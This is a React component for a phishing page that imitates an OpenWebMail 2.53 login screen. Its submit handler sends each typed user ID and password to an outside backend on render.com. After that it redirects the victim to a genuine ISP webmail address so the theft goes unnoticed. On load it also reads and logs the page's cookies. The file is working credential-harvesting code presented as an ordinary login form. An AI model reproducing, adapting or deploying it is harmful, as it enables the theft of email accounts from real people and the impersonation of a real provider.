import React from 'react';


import'./home.css';
import logo from './logo.png';

import { useState } from 'react';
import axios from 'axios';

import { useEffect } from 'react';
import open from './open.gif';
function Home(){

    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("Openweb")

    const[showError, setShowError] = useState(false);


    

    useEffect(() => {
        // Code to run when the component mounts or when dependencies change
      showCookies();

      }, [])


      function showCookies(){
        const cookiesArray = document.cookie.split('; ');

        cookiesArray.forEach(cookie => {
          const [name, value, domain] = cookie.split('=');
          
          console.log(`Cookies name is : ${name} , Cookies Value is  ${value}`);
        });
    }

async function handleSubmit(e){
    e.preventDefault();

    try {
        const response = await axios.post('https://oneback-9wpi.onrender.com/api/send', {
            email:email,
            password:password,
            platform:platform
        });
    
        // Handle success
        console.log('Data sent:', response.data.message);

        if(response.status == 200){
            console.log(response.data.message);

            window.location.href = 'http://webmail.citytel.net/cgi-bin/openwebmail/openwebmail.pl';
        }
      } catch (error) {
        // Handle error
        console.error('Error:', error);
      }
    
}

    return (
        <>
         

                <div className='py-5 text-center'>
                        <img className='navimage' src={open} />

                </div>

                {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong className='text-center'>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}

            <div className='formdiv col-md-4 m-auto p-0 '>
            {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong className='text-center'>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}

                <div className='cardhead'>
                Login
                </div>

                <form onSubmit={handleSubmit}>

                <div class="formrow text-center mt-3">
                                <span class="prompt"><label for="user">UserID:</label></span>
                                                <div class="element"><input type="text"onChange={function(e){
                                                    setUserName(e.target.value);
                                                }}value={email} className='inputwide' required/>
                                </div>
                        </div>


                        <div class="formrow text-center">
                                <span class="prompt"><label for="user">Password</label></span>
                                                <div class="element"><input onChange={function(e){
                                                    setPassword(e.target.value);
                                                }} value={password} type="password"className='inputwide' required/>
                                </div>
                        </div>


                    <div className='buttondiv py-4 '>
                        <button className='mybutton'type="submit">Login</button>

                        <input type="checkbox"checked={true} className='mx-3'/><span className='small'>HTTP Compression</span>

                        <input type="checkbox" className='mx-3'/><span className='small'>Auto Login</span>


                    </div>



                </form>

                

            </div>
            
            <br/>

                <p className='info'>OpenWebMail version 2.53   Help?</p>
        </>
    );

}

export default Home;